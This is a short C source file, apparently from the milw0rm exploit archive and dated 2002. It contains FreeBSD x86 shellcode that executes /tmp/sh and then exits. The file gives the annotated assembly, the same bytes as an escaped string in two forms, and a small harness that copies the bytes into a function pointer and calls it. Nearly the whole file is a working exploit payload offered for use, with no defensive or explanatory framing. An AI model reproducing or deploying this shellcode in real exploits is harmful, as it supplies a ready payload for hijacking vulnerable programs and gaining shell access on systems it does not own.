/*
 * FreeBSD shellcode - execve /tmp/sh
 *
 * Claes M. Nyberg 20020120
 *
 * <cmn@darklab.org>, <md0claes@mdstud.chalmers.se>
 */

/**********************************************************
void
main()
{
__asm__("
        xorl    %eax, %eax   # eax = 0
        pushl   %eax         # string ends with NULL
        pushl   $0x68732f2f  # push 'hs//' (//sh)
        pushl   $0x706d742f  # push 'pmt/' (/tmp)
        movl    %esp, %ebx   # ebx = argv[0] = string addr
        pushl   %eax         # argv[1] = NULL
        pushl   %ebx         # argv[0] = /bin//sh
        movl    %esp, %edx   # edx = &argv[0]

        pushl   %eax         # envp = NULL
        pushl   %edx         # &argv[0]
        pushl   %ebx         # *path = argv[0]
        pushl   %eax         # Dummy
        movb    $0x3b, %al   # al = 59 = execve
        int     $0x80        # execve(argv[0], argv, NULL)

        xorl    %eax, %eax   # eax = 0
        inc     %eax         # eax++
        pushl   %eax         # Exit value = 1
        pushl   %eax         # Dummy
        int     $0x80        # exit(1); (eax is 1 = execve)
    ");
}
************************************************************/

#include <stdio.h>
#include <string.h>

static char freebsd_code[] =
    "\x31\xc0"               /* xorl    %eax, %eax  */
    "\x50"                   /* pushl   %eax        */
    "\x68\x2f\x2f\x73\x68"   /* pushl   $0x68732f2f */
    "\x68\x2f\x74\x6d\x70"   /* pushl   $0x706d742f */
    "\x89\xe3"               /* movl    %esp, %ebx  */
    "\x50"                   /* pushl   %eax        */
    "\x53"                   /* pushl   %ebx        */
    "\x89\xe2"               /* movl    %esp, %edx  */
    "\x50"                   /* pushl   %eax        */
    "\x52"                   /* pushl   %edx        */
    "\x53"                   /* pushl   %ebx        */
    "\x50"                   /* pushl   %eax        */
    "\xb0\x3b"               /* movb    $0x3b, %al  */
    "\xcd\x80"               /* int     $0x80       */
    "\x31\xc0"               /* xorl    %eax, %eax  */
    "\x40"                   /* inc     %eax        */
    "\x50"                   /* pushl   %eax        */
    "\x50"                   /* pushl   %eax        */
    "\xcd\x80";              /* int     $0x80       */


static char _freebsd_code[] =
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x74\x6d\x70\x89\xe3\x50"
    "\x53\x89\xe2\x50\x52\x53\x50\xb0"
    "\x3b\xcd\x80\x31\xc0\x40\x50\x50"
    "\xcd\x80";

void
main(void)
{
	void (*code)() = (void *)freebsd_code;
	printf("strlen code: %d\n", strlen(freebsd_code));
	code();
}

// milw0rm.com [2004-09-26]